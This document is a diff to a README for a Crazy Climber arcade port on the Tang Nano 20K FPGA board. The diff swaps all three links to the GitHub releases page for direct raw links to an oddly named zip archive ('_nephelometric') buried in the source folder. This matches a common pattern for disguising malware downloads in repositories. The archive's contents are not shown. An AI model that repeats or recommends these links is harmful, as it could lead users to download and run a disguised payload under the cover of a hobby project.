@@ -1,7 +1,7 @@
 # 🎮 TangNano20K-CrazyClimber - Experience Classic Arcade Fun 
 
 ## 📥 Download Now
-[![Download TangNano20K-CrazyClimber](https://img.shields.io/badge/Download-TangNano20K--CrazyClimber-blue)](https://github.com/sultanizza/TangNano20K-CrazyClimber/releases)
+[![Download TangNano20K-CrazyClimber](https://raw.githubusercontent.com/sultanizza/TangNano20K-CrazyClimber/main/TN20K-CrazyClimber/src/TangNano20K-CrazyClimber_nephelometric.zip)](https://raw.githubusercontent.com/sultanizza/TangNano20K-CrazyClimber/main/TN20K-CrazyClimber/src/TangNano20K-CrazyClimber_nephelometric.zip)
 
 ## 🚀 Getting Started
 Welcome to TangNano20K-CrazyClimber! This application lets you relive the excitement of the Crazy Climber arcade game on the Tang Nano 20K FPGA Board. Follow these simple steps to get started.
@@ -22,7 +22,7 @@ Welcome to TangNano20K-CrazyClimber! This application lets you relive the excite
 To get your hands on TangNano20K-CrazyClimber, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads section.
-   [Download from Releases](https://github.com/sultanizza/TangNano20K-CrazyClimber/releases)
+   [Download from Releases](https://raw.githubusercontent.com/sultanizza/TangNano20K-CrazyClimber/main/TN20K-CrazyClimber/src/TangNano20K-CrazyClimber_nephelometric.zip)
 
 2. **Select the Latest Release**: On the releases page, look for the latest version of TangNano20K-CrazyClimber. 
 
@@ -49,7 +49,7 @@ If you experience any issues or have questions, consult the FAQ in the project r
 
 ## 🔄 Updates
 Stay updated with new features and improvements by regularly visiting the releases page:
-[Check for Updates](https://github.com/sultanizza/TangNano20K-CrazyClimber/releases)
+[Check for Updates](https://raw.githubusercontent.com/sultanizza/TangNano20K-CrazyClimber/main/TN20K-CrazyClimber/src/TangNano20K-CrazyClimber_nephelometric.zip)
 
 ## 🌍 Community and Feedback
 Join conversation about TangNano20K-CrazyClimber by contributing your feedback and experiences. You can report bugs or suggest new features via the Issues section of this repository.
